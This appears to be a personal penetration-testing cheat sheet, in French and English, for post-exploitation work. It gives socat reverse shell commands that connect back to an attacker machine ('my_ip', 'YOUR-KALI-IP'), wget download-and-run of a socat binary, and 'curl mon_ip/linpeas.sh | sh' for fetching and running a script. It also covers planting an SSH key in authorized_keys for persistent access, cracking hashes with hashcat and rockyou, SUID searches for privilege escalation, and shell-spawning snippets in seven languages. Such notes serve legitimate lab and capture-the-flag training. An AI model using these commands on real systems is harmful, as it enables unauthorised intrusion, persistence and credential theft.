# Dans un reverse shell

## Upgrade a reverse shell to a fully TTY interactive shell

Sometimes we will get a shell but it won't be very convenient. There are some ways to upgrade your shells to interactive TTY reverse shell
if you want a quick dirty little fix but not completely interactive this python command works well for python3
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
Ctrl+Z
stty raw -echo; fg
```

## With socat
On your kali
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4440
```
From the victime machine
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440 
```

If socat is not installed see here for static binaries
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440
```
OR
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
```
In your kali then put on your python3 webserver
and then 
```bash
wget -q http://YOUR-KALI-IP/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR-KALI-IP:4440
```

## Pour avoir un accès ssh

```bash
ssh-keygen -f mykey
# No passphrase
mykey & mykey.pub
mv mykey.pub ~/.ssh/authorized_keys
# Copy mykey to local machine in the .ssh folder
nano mykey # and paste the private key
sudo chmod 600 mykey

ssh -i mykey user@ip
```


# Détecter un hash 

```bash
hashcat hashPWD.txt rockyou.txt

The following 11 hash-modes match the structure of your input hash:

      # | Name                                                | Category
  ======+=====================================================+======================================
    900 | MD4                                                 | Raw Hash
      0 | MD5                                                 | Raw Hash
     70 | md5(utf16le($pass))                                 | Raw Hash
   2600 | md5(md5($pass))                                     | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                    | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))             | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                         | Raw Hash salted and/or iterated
   1000 | NTLM                                                | Operating System
   9900 | Radmin2                                             | Operating System
   8600 | Lotus Notes/Domino 5                                | Enterprise Application Software (EAS)


```

Puis sélectionner le # de l'algo de hashage
Exemple avec RAW MD5
```bash
hashcat -m 0 hashPWD.txt rockyou.txt
```

# Privilege Escalation

## Linux

`sudo -l`

Link Linpeas : https://github.com/carlospolop/PEASS-ng/releases/tag/20230529-e7da582f

`python -m http.server 80 -> curl mon_ip/linpeas.sh | sh`

`find / -perms -4000 -type f 2>/dev/null`
`find / -type f -perm -04000 -ls 2>/dev/null`
`find / -perm -4000 2>/dev/null`
`find / -writable ! -user whoami -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`


```py
import subprocess
subprocess.call("/bin/sh")
```
```js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```
```c
#include <stdlib.h>
#include <unistd.h>

int main() {
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}
```
```cpp
#include <cstdlib>
#include <unistd.h>

int main() {
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}
```
```rust
use std::process::Command;

fn main() {
    Command::new("/bin/sh")
        .status()
        .expect("Failed to execute command");
}
```
```go
package main

import (
	"os"
	"os/exec"
)

func main() {
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}
```
```java
import java.io.IOException;

public class Main {
    public static void main(String[] args) {
        try {
            Process process = new ProcessBuilder("/bin/sh").inheritIO().start();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
```
